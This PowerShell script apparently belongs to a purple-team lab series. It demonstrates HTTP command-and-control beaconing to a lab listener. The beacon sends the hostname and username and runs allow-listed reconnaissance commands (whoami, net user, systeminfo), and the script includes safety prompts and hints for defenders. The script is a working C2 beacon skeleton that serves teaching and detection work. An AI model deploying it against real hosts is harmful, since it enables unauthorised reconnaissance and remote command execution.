<#
.SYNOPSIS
    Educational Purple Team demo - Command & Control via HTTP beacon (Phase 4)

.DESCRIPTION
    Safely demonstrates MITRE ATT&CK Command and Control using a simple HTTP
    beacon. Designed for the SANS SEC504 lab (Windows 10 Enterprise + Slingshot).

    Technique:
    - T1071.001  Application Layer Protocol: Web Protocols (HTTP)

    Behaviour:
    - Periodic HTTP check-ins to a lab listener (default: Slingshot 10.10.75.1:8080)
    - Sends basic host context (hostname, user, timestamp)
    - Accepts only a hard-coded allow-list of benign commands
    - Writes clear local markers and a report for defensive hunting

    No real C2 framework, no encryption of traffic, no persistence, no
    credential theft, no file download/upload beyond the beacon itself.

.NOTES
    Author          : infosec-portfolio / Purple Team ATT&CK series
    Lab             : SANS SEC504 Windows 10 Enterprise + Slingshot
    Requires        : PowerShell 5.1+; network reachability to the listener
    Ethical Use     : AUTHORIZED LAB USE ONLY. Never run on production or
                      systems you do not own / lack explicit permission to test.

.PARAMETER ListenerHost
    IP or hostname of the C2 listener. Default: 10.10.75.1 (Slingshot)

.PARAMETER Port
    TCP port the listener is bound to. Default: 8080

.PARAMETER IntervalSeconds
    Seconds between beacons. Default: 15

.PARAMETER MaxBeacons
    Maximum number of check-ins before the script exits. Default: 8
    (keeps the demo short and controlled)

.EXAMPLE
    .\Invoke-C2BeaconDemo.ps1

.EXAMPLE
    .\Invoke-C2BeaconDemo.ps1 -ListenerHost 10.10.75.1 -Port 8080 -MaxBeacons 5
#>

param(
    [string]$ListenerHost   = "10.10.75.1",
    [int]$Port              = 8080,
    [int]$IntervalSeconds   = 15,
    [int]$MaxBeacons        = 8
)

# ---------------------------------------------------------------------------
# Safety Banner
# ---------------------------------------------------------------------------
$banner = @"

========================================================================
           PURPLE TEAM - PHASE 4 : C2 BEACON DEMO (HTTP)

  EDUCATIONAL / AUTHORIZED LAB USE ONLY
  This script sends simple HTTP beacons to a lab listener and will only
  execute a hard-coded allow-list of benign commands (whoami, hostname,
  etc.). No real malware C2, no persistence, no credential access.

  Default listener : http://$ListenerHost`:$Port
  (Slingshot recommended)

  Artifacts are created under PurpleTeam-Phase4\C2\

  Do NOT run this against systems you do not own or lack
  explicit written permission to test.
========================================================================

"@
Write-Host $banner -ForegroundColor Cyan

$confirm = Read-Host "Type YES to continue in a lab environment"
if ($confirm -ne "YES") {
    Write-Host "[!] Aborted by user." -ForegroundColor Yellow
    exit
}

# ---------------------------------------------------------------------------
# Setup staging location
# ---------------------------------------------------------------------------
$stagingRoot = Join-Path $PSScriptRoot "PurpleTeam-Phase4"
$c2Dir       = Join-Path $stagingRoot "C2"
$reportFile  = Join-Path $c2Dir "C2-Beacon-Report.txt"
$markerFile  = Join-Path $c2Dir "C2BeaconDemo-Marker.txt"
$beaconLog   = Join-Path $c2Dir "Beacon-Activity.log"

foreach ($dir in @($stagingRoot, $c2Dir)) {
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
}

$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$beaconId  = "PT4-" + (Get-Date -Format "HHmmss")
$baseUri   = "http://${ListenerHost}:${Port}"

$report = @()
$report += "=== Purple Team Phase 4 - C2 Beacon Demo ==="
$report += "Timestamp     : $timestamp"
$report += "User          : $env:USERNAME"
$report += "Host          : $env:COMPUTERNAME"
$report += "Beacon ID     : $beaconId"
$report += "Listener      : $baseUri"
$report += "Interval      : $IntervalSeconds seconds"
$report += "Max Beacons   : $MaxBeacons"
$report += "---------------------------------------------"
$report += ""

Write-Host ""
Write-Host "[*] Staging directory : $c2Dir" -ForegroundColor Green
Write-Host "[*] Beacon ID         : $beaconId" -ForegroundColor Green
Write-Host "[*] Listener          : $baseUri" -ForegroundColor Green
Write-Host ""

# ---------------------------------------------------------------------------
# Hard-coded allow-list of commands the beacon is permitted to execute
# ---------------------------------------------------------------------------
$allowedCommands = @{
    "whoami"           = { whoami }
    "hostname"         = { hostname }
    "ipconfig"         = { ipconfig /all }
    "net user"         = { net user }
    "systeminfo"       = { systeminfo }
    "dir public"       = { Get-ChildItem C:\Users\Public -ErrorAction SilentlyContinue | Select-Object Name, Length, LastWriteTime }
    "get-process"      = { Get-Process | Select-Object -First 15 Name, Id, CPU }
    "get-date"         = { Get-Date -Format "yyyy-MM-dd HH:mm:ss" }
}

# ---------------------------------------------------------------------------
# Helper: send a beacon and optionally process a command response
# ---------------------------------------------------------------------------
function Send-Beacon {
    param(
        [string]$Uri,
        [string]$BeaconId,
        [int]$Sequence,
        [string]$LastResult = ""
    )

    $bodyObj = @{
        beacon_id   = $BeaconId
        sequence    = $Sequence
        hostname    = $env:COMPUTERNAME
        username    = $env:USERNAME
        timestamp   = (Get-Date -Format "o")
        os          = "Windows"
        last_result = $LastResult
    }
    $jsonBody = $bodyObj | ConvertTo-Json -Compress

    try {
        # Prefer POST; fall back to GET query if POST is rejected by simple listeners
        $response = Invoke-WebRequest -Uri "$Uri/beacon" `
                                      -Method POST `
                                      -Body $jsonBody `
                                      -ContentType "application/json" `
                                      -TimeoutSec 8 `
                                      -UseBasicParsing `
                                      -ErrorAction Stop

        $statusCode = $response.StatusCode
        $content    = $response.Content.Trim()

        Write-Host "    [+] Beacon #$Sequence → HTTP $statusCode" -ForegroundColor Green
        return @{ Success = $true; Status = $statusCode; Content = $content }
    }
    catch {
        # Fallback: simple GET with query parameters (works with python -m http.server style)
        try {
            $qs = "id=$BeaconId&seq=$Sequence&host=$env:COMPUTERNAME&user=$env:USERNAME"
            $response = Invoke-WebRequest -Uri "$Uri/beacon?$qs" `
                                          -Method GET `
                                          -TimeoutSec 8 `
                                          -UseBasicParsing `
                                          -ErrorAction Stop

            Write-Host "    [+] Beacon #$Sequence (GET fallback) → HTTP $($response.StatusCode)" -ForegroundColor Green
            return @{ Success = $true; Status = $response.StatusCode; Content = $response.Content.Trim() }
        }
        catch {
            Write-Host "    [!] Beacon #$Sequence failed: $($_.Exception.Message)" -ForegroundColor Red
            return @{ Success = $false; Status = 0; Content = $_.Exception.Message }
        }
    }
}

# ---------------------------------------------------------------------------
# Main beacon loop
# ---------------------------------------------------------------------------
Write-Host "[+] Starting HTTP beacon loop (max $MaxBeacons check-ins)..." -ForegroundColor Yellow
Write-Host "    Press Ctrl+C to abort early if needed." -ForegroundColor DarkGray
Write-Host ""

$activityLog = @()
$activityLog += "=== Beacon Activity Log ==="
$activityLog += "Started : $timestamp"
$activityLog += ""

$lastResult = ""
$successfulBeacons = 0

for ($i = 1; $i -le $MaxBeacons; $i++) {
    Write-Host "[*] Check-in $i of $MaxBeacons ..." -ForegroundColor Cyan

    $result = Send-Beacon -Uri $baseUri -BeaconId $beaconId -Sequence $i -LastResult $lastResult

    $logLine = "[$(Get-Date -Format 'HH:mm:ss')] Seq=$i Success=$($result.Success) Status=$($result.Status)"
    $activityLog += $logLine
    $report += $logLine

    if ($result.Success) {
        $successfulBeacons++

        # Look for an allow-listed command in the response body
        # Expected format from a cooperating listener:  CMD:whoami   or just the raw command
        $cmdCandidate = $null
        if ($result.Content -match '(?i)CMD:\s*(.+)') {
            $cmdCandidate = $Matches[1].Trim()
        }
        elseif ($result.Content -and $allowedCommands.ContainsKey($result.Content.Trim().ToLower())) {
            $cmdCandidate = $result.Content.Trim().ToLower()
        }

        if ($cmdCandidate -and $allowedCommands.ContainsKey($cmdCandidate.ToLower())) {
            Write-Host "    [*] Allowed command received: $cmdCandidate" -ForegroundColor Yellow
            try {
                $output = & $allowedCommands[$cmdCandidate.ToLower()] | Out-String
                $lastResult = $output.Trim()
                Write-Host "    [+] Command executed. Result length: $($lastResult.Length) chars" -ForegroundColor Green
                $activityLog += "    CMD executed: $cmdCandidate"
                $report += "    CMD executed: $cmdCandidate"
            }
            catch {
                $lastResult = "ERROR: $($_.Exception.Message)"
                Write-Host "    [!] Command execution failed: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        else {
            if ($result.Content) {
                Write-Host "    [*] Listener response (no allowed command): $($result.Content.Substring(0, [Math]::Min(80, $result.Content.Length)))" -ForegroundColor DarkGray
            }
            $lastResult = ""
        }
    }

    if ($i -lt $MaxBeacons) {
        Write-Host "    [*] Sleeping $IntervalSeconds seconds..." -ForegroundColor DarkGray
        Start-Sleep -Seconds $IntervalSeconds
    }
}

# ---------------------------------------------------------------------------
# Write report + marker + activity log
# ---------------------------------------------------------------------------
$report += ""
$report += "=== Summary ==="
$report += "Successful beacons : $successfulBeacons / $MaxBeacons"
$report += "Technique          : T1071.001 (HTTP)"
$report += "Listener           : $baseUri"
$report += ""

$report | Out-File -FilePath $reportFile -Encoding UTF8
$activityLog | Out-File -FilePath $beaconLog -Encoding UTF8

$markerContent = @"
Purple Team Phase 4 - C2 Beacon Demo Marker
-------------------------------------------
Executed     : $timestamp
User         : $env:USERNAME
Computer     : $env:COMPUTERNAME
Beacon ID    : $beaconId
Listener     : $baseUri
Technique    : T1071.001 Application Layer Protocol: Web Protocols
Successful   : $successfulBeacons / $MaxBeacons
Report       : $reportFile
Activity Log : $beaconLog

This marker was created by Invoke-C2BeaconDemo.ps1 for defensive hunting.

Cleanup:
  Remove-Item -Recurse -Force '$stagingRoot'
"@
$markerContent | Out-File -FilePath $markerFile -Encoding UTF8

Write-Host ""
Write-Host "[+] C2 Beacon demo complete." -ForegroundColor Green
Write-Host "    Successful beacons : $successfulBeacons / $MaxBeacons" -ForegroundColor Cyan
Write-Host "    Report             : $reportFile" -ForegroundColor Cyan
Write-Host "    Activity log       : $beaconLog" -ForegroundColor Cyan
Write-Host "    Marker             : $markerFile" -ForegroundColor Cyan
Write-Host ""
Write-Host "[*] Defenders should look for:" -ForegroundColor Green
Write-Host "    - Sysmon EID 3  (Network connection) to ${ListenerHost}:$Port" -ForegroundColor Gray
Write-Host "    - Sysmon EID 1  (Process Create) for powershell.exe making the requests" -ForegroundColor Gray
Write-Host "    - Unusual periodic HTTP traffic from the Windows host to Slingshot" -ForegroundColor Gray
Write-Host "    - Marker / report files under PurpleTeam-Phase4\C2\" -ForegroundColor Gray
Write-Host ""
Write-Host "[*] Cleanup when finished:" -ForegroundColor Yellow
Write-Host "    Remove-Item -Recurse -Force '$stagingRoot'" -ForegroundColor Yellow
Write-Host ""
